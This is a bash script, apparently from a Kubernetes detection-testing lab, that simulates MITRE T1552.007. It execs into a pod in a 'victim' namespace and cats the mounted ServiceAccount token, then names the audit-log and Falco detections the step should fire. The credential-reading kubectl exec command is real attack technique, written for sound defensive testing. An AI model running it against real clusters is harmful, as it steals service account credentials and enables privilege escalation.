#!/bin/bash
# ============================================================================
# Attack Simulation: Exec into a Victim Pod (Steal SA Token via API)
# MITRE ATT&CK: T1552.007 - Unsecured Credentials: Container API
# Stratus technique: k8s.credential-access.steal-serviceaccount-token
# Run from: kubectl exec -it kubectl -n attacker -- /bin/sh
# Fires detection: the create pods/exec event in AKSAuditAdmin.
# ============================================================================
#
# TACTIC: Credential Access (TA0006). `kubectl exec` runs a command inside an existing
# pod. An attacker with exec rights uses it to reach into a VICTIM pod and read that
# pod's ServiceAccount token — stealing a second, possibly more privileged identity
# without ever deploying anything of their own.
#
# THIS IS AN INTENTIONAL ATTACK SIMULATION for detection testing.
#
# NOTE ON COVERAGE: the apiserver logs the `create pods/exec` request, but the
# actual token READ inside the target pod is off-log to the API server — that
# read is caught on the RUNTIME plane by Falco (detections/falco/token-theft.yaml).
# This is a textbook two-plane technique: API sees the exec, Falco sees the read.
#
# WHAT A DEFENDER SHOULD SEE: an AKSAuditAdmin `create pods/exec` entry (API plane)
# correlated with a Falco token-read alert from inside the target pod (runtime plane).

# Abort on first error.
set -e
# Pick the first pod in the "victim" namespace to target. `-o jsonpath` extracts just
# the name of items[0]; stderr is silenced so a "no pods" case yields an empty string.
TARGET_NS="victim"
TARGET=$(kubectl get pod -n "$TARGET_NS" -o jsonpath='{.items[0].metadata.name}' 2>/dev/null)

# Guard: if the namespace has no pod to exec into, bail out with a clear message.
if [ -z "$TARGET" ]; then
  echo "[!] No pod found in namespace '$TARGET_NS' to exec into."
  exit 1
fi

echo "[*] Exec into $TARGET_NS/$TARGET and reading its mounted SA token..."
# The technique itself: exec into the victim pod and `cat` its auto-mounted SA token to
# stdout, exfiltrating that pod's identity. `|| true` keeps the script exiting cleanly
# even if the exec is denied (RBAC) — the ATTEMPT is already logged as create pods/exec.
kubectl exec -n "$TARGET_NS" "$TARGET" -- \
  cat /var/run/secrets/kubernetes.io/serviceaccount/token || true

echo ""
# Operator-facing hints naming both detection planes for this technique.
echo "[*] Expected API detection: create pods/exec  (AKSAuditAdmin)"
echo "[*] Expected runtime detection: Falco 'Read ServiceAccount Token in Container'"
